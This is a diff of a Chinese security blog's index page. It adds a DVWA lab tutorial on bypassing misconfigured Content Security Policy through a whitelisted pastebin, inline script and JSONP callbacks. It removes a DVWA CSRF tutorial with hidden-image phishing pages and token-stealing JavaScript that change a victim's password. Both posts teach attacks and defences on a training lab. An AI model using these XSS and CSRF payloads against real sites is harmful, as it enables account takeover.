@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">371</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">146</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">373</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">147</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,7 +185,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">146</span>
+          <span class="site-state-item-count">147</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -196,7 +196,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">371</span>
+        <span class="site-state-item-count">373</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,195 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/22/DVWA-CSP-Bypass%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E7%BB%95%E8%BF%87%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/02/22/DVWA-CSP-Bypass%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%E7%BB%95%E8%BF%87%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA CSP Bypass 内容安全策略绕过通关教程</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-22 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-22T10:00:00+08:00">2021-02-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CSP（内容安全策略）是个防御 XSS 的好东西，限制网页能从哪加载资源。但如果配置不当，CSP 也能绕。</p>
+<p>这关主要学怎么绕过配置不当的 CSP。</p>
+<h2 id="CSP-基础知识"><a href="#CSP-基础知识" class="headerlink" title="CSP 基础知识"></a>CSP 基础知识</h2><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>default-src</code></td>
+<td>默认资源来源</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>JS 来源</td>
+</tr>
+<tr>
+<td><code>style-src</code></td>
+<td>CSS 来源</td>
+</tr>
+<tr>
+<td><code>img-src</code></td>
+<td>图片来源</td>
+</tr>
+<tr>
+<td><code>connect-src</code></td>
+<td>AJAX 来源</td>
+</tr>
+</tbody></table>
+<h3 id="示例配置"><a href="#示例配置" class="headerlink" title="示例配置"></a>示例配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com</span><br></pre></td></tr></table></figure>
+
+<p>意思就是默认只能加载同源资源，JS 只能从自己和 cdn.example.com 加载。</p>
+<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看 CSP 配置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com &#x27;unsafe-inline&#x27;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="variable">$headerCSP</span> );</span><br></pre></td></tr></table></figure>
+
+<p>允许从 <code>pastebin.com</code> 加载脚本，这就给了机会。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p><strong>第一步：去 pastebin.com 写个恶意脚本</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：复制 raw 链接</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pastebin.com/raw/xxxxx</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：注入</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://pastebin.com/raw/xxxxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>脚本执行了，CSP 绕过成功。白名单域名不是随便加的。</p>
+<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 的 CSP：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27; https://ssl.google-analytics.com https://pastebin.com;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>&#39;unsafe-inline&#39;</code> 允许内联脚本，这配置约等于没有 CSP。</p>
+<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>直接写内联脚本：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>允许 <code>&#39;unsafe-inline&#39;</code> 就是给 XSS 大开方便之门，还不如不设 CSP。</p>
+<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 的 CSP 严格了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="variable">$headerCSP</span> );</span><br></pre></td></tr></table></figure>
+
+<p>只允许同源脚本。但代码里有个 JSONP 接口：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;include&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="variable">$page</span>[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">        &lt;script src=&#x27;&quot;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;include&#x27;</span> ] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>include</code> 参数可控，而且加载的是同源地址。</p>
+<h3 id="攻击方法-2"><a href="#攻击方法-2" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>利用 JSONP 接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?include=http://localhost:8080/vulnerabilities/csp/source/jsonp.php?callback=alert(document.cookie)//</span><br></pre></td></tr></table></figure>
+
+<p>虽然加载的是同源脚本，但 callback 参数能注入代码，绕过 CSP。</p>
+<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 用了 nonce：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$headerCSP</span> = <span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27; &#x27;nonce-&quot;</span> . <span class="variable">$token</span> . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="variable">$headerCSP</span> );</span><br></pre></td></tr></table></figure>
+
+<p>特点：</p>
+<ol>
+<li><code>default-src &#39;self&#39;</code> 默认只允许同源</li>
+<li><code>script-src &#39;nonce-xxx&#39;</code> 只允许带正确 nonce 的脚本执行</li>
+<li>nonce 是动态生成的，猜不到</li>
+</ol>
+<p>这才是正确的 CSP 配置。</p>
+<h2 id="CSP-绕过方式"><a href="#CSP-绕过方式" class="headerlink" title="CSP 绕过方式"></a>CSP 绕过方式</h2><table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>白名单域名</td>
+<td>利用被允许的域名托管脚本</td>
+</tr>
+<tr>
+<td><code>&#39;unsafe-inline&#39;</code></td>
+<td>允许内联脚本</td>
+</tr>
+<tr>
+<td><code>&#39;unsafe-eval&#39;</code></td>
+<td>允许 eval</td>
+</tr>
+<tr>
+<td>JSONP 利用</td>
+<td>利用 JSONP callback 执行代码</td>
+</tr>
+<tr>
+<td>文件上传</td>
+<td>上传脚本到同源</td>
+</tr>
+</tbody></table>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>CSP 配置要点：</p>
+<ol>
+<li>白名单域名要谨慎，别加公共 CDN</li>
+<li>别用 <code>&#39;unsafe-inline&#39;</code> 和 <code>&#39;unsafe-eval&#39;</code></li>
+<li>用 nonce 或 hash 验证脚本</li>
+<li>JSONP 接口要检查 callback 参数</li>
+<li>定期审计 CSP 配置</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1962,133 +2151,6 @@
 <li>禁用远程文件包含 <code>allow_url_include = Off</code></li>
 <li>用 <code>open_basedir</code> 限制 PHP 能访问的目录</li>
 <li>过滤特殊字符虽然有用，但不如白名单靠谱</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/07/DVWA-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="l1n6yun">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="l1n6yun's Blog">
-      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | l1n6yun's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/07/DVWA-CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">DVWA CSRF 跨站请求伪造通关教程</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-02-07 10:00:00" itemprop="dateCreated datePublished" datetime="2021-02-07T10:00:00+08:00">2021-02-07</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">安全</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CSRF，全称 Cross-Site Request Forgery，跨站请求伪造。简单说就是攻击者伪造一个请求，诱导已经登录的用户去点，然后用户不知不觉就帮攻击者干了一些事，比如改密码、转账之类的。</p>
-<p>原理就是浏览器会自动带上 Cookie，所以只要用户登录了，请求发出去就带着身份信息，服务器分辨不出这是不是用户真的想做的操作。</p>
-<p>这关的目标是通过 CSRF 修改用户密码。</p>
-<h2 id="Low-级别"><a href="#Low-级别" class="headerlink" title="Low 级别"></a>Low 级别</h2><p>看代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">    <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>GET 请求直接改密码，啥防护都没有。</p>
-<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>正常改密码的请求长这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3892/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</span><br></pre></td></tr></table></figure>
-
-<p>那我伪造一个：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3892/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change#</span><br></pre></td></tr></table></figure>
-
-<p>做个钓鱼页面：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>恭喜您中奖了<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>恭喜您获得一等奖！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:3892/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>请点击下方按钮领取奖品<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>用户访问这个页面的瞬间，img 标签就会发送请求，密码就被改成 <code>hacked</code> 了。用户完全不知道发生了什么。</p>
-<p>试一下用新密码登录，成功！</p>
-<h2 id="Medium-级别"><a href="#Medium-级别" class="headerlink" title="Medium 级别"></a>Medium 级别</h2><p>Medium 加了 Referer 检验：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">stripos</span>( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="comment">// 允许修改密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>它检查请求头里的 Referer 是否包含服务器域名，比如 <code>localhost</code>。</p>
-<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>问题在于它只是检查包含，那我把我钓鱼页面的路径里加上 <code>localhost</code> 不就行了？</p>
-<p>比如文件名叫 <code>localhost.html</code>，或者放在 <code>localhost</code> 目录下。这样 Referer 里就会有 <code>localhost</code> 这个字符串，校验就过了。</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:3892/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>页面加载中...<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这验证写得也太随意了。</p>
-<h2 id="High-级别"><a href="#High-级别" class="headerlink" title="High 级别"></a>High 级别</h2><p>High 加了 CSRF Token：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>
-
-<p>每次请求都要带个有效 Token，攻击者不知道 Token 就没法伪造请求了。</p>
-<h3 id="攻击方法-1"><a href="#攻击方法-1" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>单纯的 CSRF 搞不定了，得配合 XSS 才行。如果有 XSS 漏洞，就能用 JavaScript 去获取页面里的 Token：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br></pre></td></tr></table></figure>
-
-<p>然后构造攻击页面：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://localhost:3892/vulnerabilities/csrf/&quot;</span>, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> response = xhr.<span class="property">responseText</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> token = response.<span class="title function_">match</span>(<span class="regexp">/user_token&#x27;\s*value=&#x27;([^&#x27;]+)&#x27;/</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> attackUrl = <span class="string">&quot;http://localhost:3892/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change&amp;user_token=&quot;</span> + token;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> attackXhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        attackXhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, attackUrl, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        attackXhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>不过这个受同源策略限制，实际场景得看具体情况，这里主要是演示思路。</p>
-<h2 id="Impossible-级别"><a href="#Impossible-级别" class="headerlink" title="Impossible 级别"></a>Impossible 级别</h2><p>Impossible 级别是真安全：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br></pre></td></tr></table></figure>
-
-<p>改用 POST 了，还强制验证 Token，密码强度也有要求。这才是正确的防护姿势。</p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>CSRF 防护要点：</p>
-<ol>
-<li>敏感操作一定要用 CSRF Token</li>
-<li>尽量用 POST，别用 GET</li>
-<li>Cookie 设置 SameSite 属性</li>
-<li>重要操作要求二次确认</li>
-<li>Referer 校验可以加，但别只指望它</li>
 </ol>
 
       
